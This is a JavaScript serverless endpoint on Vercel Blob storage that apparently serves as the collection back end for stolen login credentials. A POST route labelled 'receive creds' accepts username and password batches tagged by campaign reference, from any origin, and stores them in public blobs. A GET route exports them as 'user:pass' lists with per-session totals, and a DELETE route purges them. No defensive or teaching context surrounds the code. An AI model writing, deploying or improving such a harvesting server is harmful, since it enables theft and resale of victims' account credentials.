import { put, list, del } from '@vercel/blob';

// Each ref stored as: refhook/{ref}.json

async function getRefData(ref) {
  try {
    const { blobs } = await list({ prefix: `refhook/${ref}.json` });
    if (blobs.length === 0) return null;
    const resp = await fetch(blobs[0].url);
    return await resp.json();
  } catch { return null; }
}

async function saveRefData(ref, data) {
  await put(`refhook/${ref}.json`, JSON.stringify(data), {
    access: 'public',
    addRandomSuffix: false,
  });
}

async function getAllRefs() {
  try {
    const { blobs } = await list({ prefix: 'refhook/' });
    return blobs
      .filter(b => b.pathname.endsWith('.json'))
      .map(b => b.pathname.replace('refhook/', '').replace('.json', ''));
  } catch { return []; }
}

async function deleteRefBlob(ref) {
  try {
    const { blobs } = await list({ prefix: `refhook/${ref}.json` });
    for (const b of blobs) await del(b.url);
  } catch {}
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  // POST - receive creds
  if (req.method === 'POST') {
    try {
      const { ref, creds } = req.body || {};
      const r = ref || 'unknown';
      const ts = new Date().toISOString();

      let existing = await getRefData(r) || { creds: [], batches: 0, started: ts };

      const names = new Set(existing.creds.map(c => c.u));
      let added = 0;
      for (const c of (creds || [])) {
        const u = c.username || c.u;
        const p = c.password || c.p;
        const rid = c.ref || c.rid || r;
        if (u && !names.has(u)) {
          existing.creds.push({ u, p, rid, t: ts });
          names.add(u);
          added++;
        }
      }
      existing.batches = (existing.batches || 0) + 1;
      existing.lastUpdate = ts;

      await saveRefData(r, existing);
      return res.json({ ok: true, added, total: existing.creds.length });
    } catch (e) {
      return res.status(500).json({ error: e.message });
    }
  }

  // DELETE
  if (req.method === 'DELETE') {
    try {
      const { ref, username, deleteAll } = req.body || {};

      if (ref && deleteAll) {
        await deleteRefBlob(ref);
        return res.json({ ok: true, message: `Deleted all for ref=${ref}` });
      }

      if (ref && username) {
        let data = await getRefData(ref);
        if (data) {
          const before = data.creds.length;
          data.creds = data.creds.filter(c => c.u !== username);
          await saveRefData(ref, data);
          return res.json({ ok: true, deleted: before - data.creds.length, remaining: data.creds.length });
        }
        return res.json({ ok: false, message: 'Ref not found' });
      }

      return res.status(400).json({ error: 'Provide ref+deleteAll or ref+username' });
    } catch (e) {
      return res.status(500).json({ error: e.message });
    }
  }

  // GET
  if (req.method === 'GET') {
    try {
      const ref = req.query.ref;
      const fmt = req.query.format;

      if (ref) {
        const data = await getRefData(ref);
        if (!data) return res.json({ ok: true, ref, total: 0, creds: [] });

        if (fmt === 'txt') {
          res.setHeader('Content-Type', 'text/plain');
          return res.send(`# Ref: ${ref} | Total: ${data.creds.length}\n` + data.creds.map(c => `${c.u}:${c.p}`).join('\n'));
        }
        return res.json({ ok: true, ref, total: data.creds.length, batches: data.batches, lastUpdate: data.lastUpdate, creds: data.creds });
      }

      // Summary
      const refs = await getAllRefs();
      const summary = {};
      let totalAll = 0;
      for (const r of refs) {
        const data = await getRefData(r);
        if (data) {
          summary[r] = { total: data.creds.length, batches: data.batches, lastUpdate: data.lastUpdate };
          totalAll += data.creds.length;
        }
      }
      return res.json({ ok: true, totalCreds: totalAll, sessions: summary });
    } catch (e) {
      return res.status(500).json({ error: e.message });
    }
  }

  return res.status(405).json({ error: 'Method not allowed' });
}
